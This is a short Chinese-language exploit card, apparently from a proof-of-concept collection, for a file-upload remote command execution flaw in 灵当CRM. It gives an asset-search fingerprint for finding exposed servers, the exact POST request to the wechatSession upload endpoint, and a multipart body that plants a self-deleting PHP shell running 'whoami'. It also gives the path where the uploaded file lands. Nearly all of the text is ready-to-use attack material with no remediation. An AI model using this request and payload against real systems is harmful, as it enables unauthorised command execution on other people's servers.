# 灵当CRMindex.php文件上传致RCE漏洞

- **系统**：灵当CRMindex.php文件上传致　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="include/js/ldAjax.js"`
- **请求**：`POST /crm/wechatSession/index.php?token=9b06a9617174f1085ddcfb4ccdb6837f&msgid=1&operation=upload HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundary03rNBzFM…`

**请求体 / payload**
```
------WebKitFormBoundary03rNBzFMIytvpWhy
Content-Disposition: form-data; name="file"; filename="test.php"
Content-Type: image/jpeg
<?php system("whoami");unlink(__FILE__);?>
------WebKitFormBoundary03rNBzFMIytvpWhy--
上传定位：
/crm/storage/wechatsession/2024/10/14/test.php
```
- **预期**：200　|　—